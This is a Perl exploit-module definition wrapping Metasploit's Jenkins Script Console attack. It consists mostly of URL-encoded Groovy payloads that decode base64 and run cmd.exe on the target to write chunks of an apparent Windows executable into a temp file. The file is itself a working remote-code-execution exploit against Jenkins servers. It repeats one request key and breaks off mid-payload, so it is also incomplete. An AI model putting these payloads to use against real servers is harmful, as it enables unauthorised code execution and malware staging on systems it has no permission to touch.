package MSFExploits::Exploits::JENKINS::MSF::JenkinsScriptConsole;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::JENKINS);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "JenkinsScriptConsole";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module uses the Jenkins-CI Groovy script console to execute

        OS commands using Java.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "jenkins_script_console",
  PATH        => "",
  PATHS       => ["__\\\@URI\\.PATH__script", "jenkins/"],
  PAYLOAD     => "?",
  REFERENCES  => [
                   "https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console",
                 ],
  TITLE       => "Jenkins-CI Script-Console Java Execution",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'J_USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'API_TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'J_PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The path to the Jenkins-CI application",
  VALUE => "/jenkins/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'script',
      PAYLOAD      => 'script=sun.misc.BASE64Decoder%20XllUo%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20vSMyH%20%3d%20XllUo.decodeBuffer%28%22ZWNobyBUVnFRQUFNQUFBQUVBQUFBLy84QUFMZ0FBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTZBQUFBQTRmdWc0QXRBbk5JYmdCVE0waFZHaHBjeUJ3Y205bmNtRnRJR05oYm01dmRDQmlaU0J5ZFc0Z2FXNGdSRTlUSUcxdlpHVXVEUTBLSkFBQUFBQUFBQUNUT1BEVzExbWVoZGRabm9YWFdaNkZyRVdTaGROWm5vVlVSWkNGM2xtZWhiaEdsSVhjV1o2RnVFYWFoZFJabm9YWFdaK0ZIbG1laFZSUnc0WGZXWjZGZzNxdWhmOVpub1VRWDVpRjFsbWVoVkpwWTJqWFdaNkZBQUFBQUFBQUFBQUFBQUFBQUFBQUFGQkZBQUJNQVFRQW5UTjlTZ0FBQUFBQUFBQUE0QUFQQVFzQkJnQUFzQUFBQUtBQUFBQUFBQUJEandBQUFCQUFBQURBQUFBQUFFQUFBQkFBQUFBUUFBQUVBQUFBQUFBQUFBUUFBQUFBQUFBQUFHQUJBQUFRQUFBQUFBQUFBZ0FBQUFBQUVBQUFFQUFBQUFBUUFBQVFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFiTWNBQUhnQUFBQUFVQUVBeUFjQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU9EQkFBQWNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBQURnQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTG5SbGVIUUFBQUJtcVFBQUFCQUFBQUN3QUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQVlDNXlaR0YwWVFBQTVnOEFBQURBQUFBQUVBQUFBTUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1WkdGMFlRQUFBRnh3QUFBQTBBQUFBRUFBQUFEUUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFEQUxuSnpjbU1BQUFESUJ3QUFBRkFCQUFBUUFBQUFFQUVBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE%2bPiVURU1QJVxlWHpUUy5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20ncgZE%20%3d%20new%20String%5b3%5d%3b%0ancgZE%5b0%5d%20%3d%20%22cmd.exe%22%3b%0ancgZE%5b1%5d%20%3d%20%22/c%22%3b%0ancgZE%5b2%5d%20%3d%20new%20String%28vSMyH%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28ncgZE%29%3b%0a&Submit=Run',
      TEXT   => 'Sending Exploit #1 Request : [POST] /script',
      HEADERS      => {
        'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'script',
      PAYLOAD      => 'script=sun.misc.BASE64Decoder%20hWsSY%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20DWDix%20%3d%20hWsSY.decodeBuffer%28%22ZWNobyBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE%2bPiVURU1QJVxlWHpUUy5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20eJokp%20%3d%20new%20String%5b3%5d%3b%0aeJokp%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aeJokp%5b1%5d%20%3d%20%22/c%22%3b%0aeJokp%5b2%5d%20%3d%20new%20String%28DWDix%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28eJokp%29%3b%0a&Submit=Run',
      TEXT   => 'Sending Exploit #2 Request : [POST] /script',
      HEADERS      => {
        'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'script',
      PAYLOAD      => 'script=sun.misc.BASE64Decoder%20KcXJe%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20hgaMG%20%3d%20KcXJe.decodeBuffer%28%22ZWNobyBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRldMN0lIc0RBUUFBT2JVaTBFQVUxYWo2S1ZCRTZOdnRrR1N6MFJBN1FDakJCaEJBRHZibzBpeFFVWlhqVVVNVTQyaENIdFJ4d1h3RjBFQTdOSkFBTmdkUUR4QkFPalcrQUFBYU9CU1FBQ0UyT2poQUdERUJPZ2pCbnBNUUVFQTZQdytBQUNMVlF4dVJTdjBaczVBUVFCU1VJMVZQMUZTNkVSS0FLMkxWV09OUmZ5TlRZYWFVV2dVMGtBOVV1M2VTZ0FBVmNBUHc1b0VBQjJSRW1pUVFHS3Q2a1g3ZzhDL2cvZzVEK204QkNBQU01U0tpQWdYUUV6L0pJMHpGbFFBaTFYOE9pa1ZiT2RBV0lQRUJEdlRveEJrUUFEMUJqMEVRYWxvK05GQUFPaHRCZ0NCNlNzNUFBQW9pR2kvKzlxMkFKd0E2UjRFQUFDSkhSVFFRQURwRkFRQTlZdEYvRkQvM1d6QlFBQnZHTXBBQU9uOUF3QUFpMDM4V2Y4VmJNRkFwcU5zQWtFQTZla0Q5d0E1SFdBQ2VBQitEV2pZSExJQTZCUUdFZ0NEeEpMSEJXQVVRWEgvLzlQLzZjalpBQUNMVmNOUy94V0l3VUFBcG9IeFFZVHBzUU9hL29saUhOUC9BT21wQS9NQWkwWDgwLzhWVU1GQUFLTTJGMEVBM0pJRGxnRHZIU0E5UUFEcGlnTUFBRGxxWUFKQkFIUU4wNzNSUUFDTHNyNUFBTzNFQkl0Ti9Qcm9YalVBLzl6RUJJRERkUS9IQldBaG9BQUJBQUNYQmxZREFQQ1RIU0JKUVFBUDExMERBQUE%2bPiVURU1QJVxlWHpUUy5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20PeuhU%20%3d%20new%20String%5b3%5d%3b%0aPeuhU%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aPeuhU%5b1%5d%20%3d%20%22/c%22%3b%0aPeuhU%5b2%5d%20%3d%20new%20String%28hgaMG%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28PeuhU%29%3b%0a&Submit=Run',
      TEXT   => 'Sending Exploit #3 Request : [POST] /script',
      HEADERS      => {
        'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'script',
      PAYLOAD      => 'script=sun.misc.BASE64Decoder%20BRGmv%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20XsRJD%20%3d%20BRGmv.decodeBuffer%28%22ZWNobyBSOUJWd3dVQUFPUjFnQWtFeWRBMW9vTkdPQU9ockJRQ0pneWNFNWxYOFVoQS9OZGNBZzU4RUxjTjE2TWNGSUFKQkFBSUFId0RwYUFNUEFEa2R3VGhCQUErRUF3TUFMRkJDRmN2QlFBREhCVndDUVkwQkFQd0E2ZTBKQUFDTFJmd0YveFVVTytFQW8xai9RUURwMWdJQVE0dE4vS2YvM216QlFBQnBaQUlBQU1kOUVOQkF6cEsxVWdEcHVFc0Fmb3RGRXdJK09FRUFLOUNLQ0lnTUFuWTZ5M1gyRUtJcUFKUlNob1doMVI5QkFBSm9uTkdjQUZKZGtORzZiZXpIYjBZQUFJUEVRYVBNUUVHVGozdWNBUDJMZlJhTERYU1kwQUFDZ2dGK0VUTlVWZ2lLRjFMLzFvdDkvSVBFQ09zU2l3MTR3VUFBTThDS0I0c0tpc0JDZzVFSU94eDBCa2VKZmZ6cnlJUEpUak1mOHE2djBXUlI2TXFnQUFENEFLRUFBQnNOYUdqUlFBRG9XUVF4UUlQRUZJdFYvSExKLzR2Nk84RHlydmZSU1kzNDlQdi8veVJTVU9qSm9BQUFVNDJOOVB2Ly8yZ0wwVUJFQm1oUTBUVUE2WTRBQUFDTGZmeUxEV1BCUUFDRE9RRnRFVE1VcDg3Z0YxTC8xb3Q5L0lQRUNPc1NpdzBod1RjQUlzQ0tYSXNiaWdSQ1JPQUlPOE4wQnBuUmZmenJaSVBKWGpQQVdaMzMwVWxMNkRlZ0FKWTlBQVFBQkhaZGFEVFJRSjdqeGdnQUFJUEVCSGxWL0lQSi80czdtOER5cnZmblNZMkY5UHRLckZIeFVPZzJFUUFBVTQyTjlQdi8vMmljMFVBbElXZ1kwVUFBaXhVRUdGb0FpT2dGOVB2Ly82R0N6MEVBVWxEb3V4d0FBSVBFR0tNRUdFRTE2WFczQU11TFRmeW5GVWhOUVFDaFRFQzlBRk05bk5GQUFBdnhVT2lTUkFBQWkwMzhpejJNd1IwQWFwdG9FTkZBbE1DalNFQkJBSURrZzRsOGhjQmREOGNGdlFKQkFBRUFBRTNwNmdBNkFHRlYvTlFIYUhQUlFBQlN2RXFEeEF5RndIVVB4L2FFQWtFQXpBQ1RUd0RIQUFBQUtrWDhhZ3VTL05CQUFGLy9CY25FRExYQU00VU5tZ0FBeHdXQUFzRUFBUUFBVmVtZ3UzUUF4d1dJQWtFQUFRQ0dBT21SQUFBQWkwMzh4d1dJQkQwQUFRQWJBR2tOYlJkZUFQaDhpNVg4YWpwUy94WHd3VUFBZzhRSU84T3BjbXE3UUZDWUZXenBRQURZeEVDajBmeEJBSXRGL0xwQVBFSFlLOUNLL2IwTUFrQjl5eUgyeDFwNC9VR3JBUUFBQU9zM2FVWDh4d1UxQWc0QUFRQUFBS09vaWtFQTZ5UExUV1RIQllnR1FRQUJBQUFBaVEwOEYwRUF6ZzZMdFF5TEFsRHQvZHNBQUlQRXI0dng5SXRXL0pGVisxSGZhQlRTUUZ4UUgwUkdBQUNGd0ErRWhmdi8vNHRGQjJkTkNJczFnTUZBVmttR1NBeDBLSi9EREVZTkxjQ3dBSVBCazg4Q1VMbmMwRUNTMi8vV2kxV1lpL1ZRNktndEFKaUxSZkNEeEVlTFNBeUxVQnlMRklyaGlVZ01vVXhBNXdCU1VJakpRZ0RRUE9qVEx3QUFpc1FFaGNCMEpJdE5ES0hJd0VBQWc4QkFpeEZTYU1qUWJWcm0vaHFMVFF5TEVWTG91UzNxQUlQRUVLRVkwRUFBTzhOOGFqMGdUdUFBZmkrTFJReWJGY2pBUUZkb0lFNkNBSU1RUUljSXhXaUQwRUFBVXY4dGkwVU1pd2hqNkNGdUFJS2hHTkJBQUlQRUZJc05FTkJBZWp0RGZrK0xtQXlMdzhqQXBBQ0R3VUNMdmxCb1dOQkFURkhxMW90VkRJc0N0ZWp0TEFBQWl3MFEwRUNCZzdNUU9SMFUwRUFBbHo1SytaWkxBQUIrTnJobmxCcnhZdW5wK2dLTHBzSHBId1BSZy9wa2lSVVUwRUFBZlNESEJma2txUUJrQUhDN3R4VG90U3dBQUY5ZS84REZpK1ZkdzRua085QkFBT2dqTEFCczZBczRBQUNMRlV4QVFYQlM2SEkzQUFCZnBZN0FXNHZsb2NPUW14SmdBQzFNUUFEaTdGY0ErQk5Bdm9FUjFBQ2JFbGdBNkVsQUFMb1VRQUFXRWRJQWpoRkFRSkpVUUFBTm9rRFpUdGhBZ2dnVlFBQ3hFVUFBNk9SQUFMLzZRQVNNNytVQTl4QkFBQm9TUU04NUVrQy8weEZBQUNrU1FCaDJGQjRBaFJTM0FOOFVBd0NQRkVBQXZSVkFBQUFiQVJzYkc4NENHM2tiR3hzYkcyTWJHd1FGbEFhN2l4c2JHeHNiZ1JzYkd3Z0pDZ3NiREc0T0d3L0ZHeEFiRVZNVFl6SVZSaGNZR1JxUUlwQ1FrSkNRa0pCM2tBZVFrRldMN0l0RkJvc055TUJBQUI2RHdVQm9kT1JSQUZIL0ZZREJqd0FVckFKQkFJUHNESVhBZEZaUWFGU1RPUUQvRldUQnpBQ0R4SDlUQWY4VmNNRkFBSkFMaSt5QmFiZ0FBTCtoZUFKQkFFN0FvVXhBTmdEUkZHalcwRUVBVU9pZVFBQUFaa1VOZEFKQkFPc1U%2bPiVURU1QJVxlWHpUUy5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20OZhRh%20%3d%20new%20String%5b3%5d%3b%0aOZhRh%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aOZhRh%5b1%5d%20%3d%20%22/c%22%3b%0aOZhRh%5b2%5d%20%3d%20new%20String%28XsRJD%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28OZhRh%29%3b%0a&Submit=Run',
      TEXT   => 'Sending Exploit #4 Request : [POST] /script',
      HEADERS      => {
        'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT5 => {
      METHOD       => 'POST',
      PATH   => 'script',
      PAYLOAD      => 'script=sun.misc.BASE64Decoder%20xxyBd%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20MuXyy%20%3d%20xxyBd.decodeBuffer%28%22ZWNobyBpeFVnR0VHZVVsRG9pRUFBQUdiMURmUVhiQUNqQ0JoQzdIK0lBa0VBVTFhTE5XVEJRQURLaVc1UGdrRUFoY0JYZFYyTDB3QVlRUUJTYUtyVVFBQ0QxcUY0QWtFQWc4UUloWWgwRmFGL0FrRUFVR2dEUEVFQU5ZVFVRRTM1MW9QRWxLRVUyRUFBWXNDNGdOdEFWWFVGdUh6VVFBQlFhRGZVUUFELzFvc055TUJBQUlNU0lGRnZGUzdmUUFENHhBeUxGUmgwUUFDTE5WakJRQUJvL2dnQUFGSmkxcU93RGhnQW9SRFFRQUJZSUZELzFvc05URUJCQUlzVkdOQkE5WVBFRUtQSUMwRUFKOEpSTjJqNEYwRUE2SUZIY2dCZUdxWU9VR2hRNjBCcjZJY0ZBQUNEd255aGZBSm1BSVUwZWpXaHJBdEJBSXNObkFzSUFJc1ZTR05CQUdvQWhaelJRSVpRb1V4QVFXTlJsa2pVUUFBQ1VQZTdQd0JXZ3hXSW8waEFRUURydTZGSVFFRjRpdzArQWtFQVc4bDFKb3ZxVEtaQkFHb0FhSnpSUUFCVVJOUkFBUGZkMU44QVVGSG9oRDhBUW9NK0dMMUlRRUYwQWcyRUFrRUFoY2wxSElzVm0wQkJBSmpBYUw3VVFBQlFVdWhlUHdBQWc4UVFvMGhBeEFDTERXQUNRUUNGeVlTUGl4VlBBa0VBdnBIVFFJdUYwblVGdnRRQ1FRQ0xGWGdDUVFDRjBvc1ZRRUJCQUJRR2l4WGs4bWtBaGNuQStQOUFBWFFGZy9EVFhRQlFvUVFZUVFCUW9VUkFRUUJiVmxKUml3MHdmaVVBYU5UVFFMeG9BQ3dBQUZIbzlHd0FBSVBFSkRGOWloVTZPRUV1djBBb0xnQ0V2blVGdjhqVFFBQ0xGV2dDUVFDai9OTkFHNFVWZGRJS0tnSkJBSXNWbHFkQkFJWFNpeFZBUUVFQWRRYTJGZVFYUVFCRCtibTV3Tk5BQUhRRnVielRRSEh4N1hDSVFRQlhVS0dGR0VHRFVPNUVRRUVBN0ZaU1VZc05NTkJBQUdoNCtrQUFhRWxlQUtsUjZIOFJBQUNEeEw4TUFLY0FBUHNO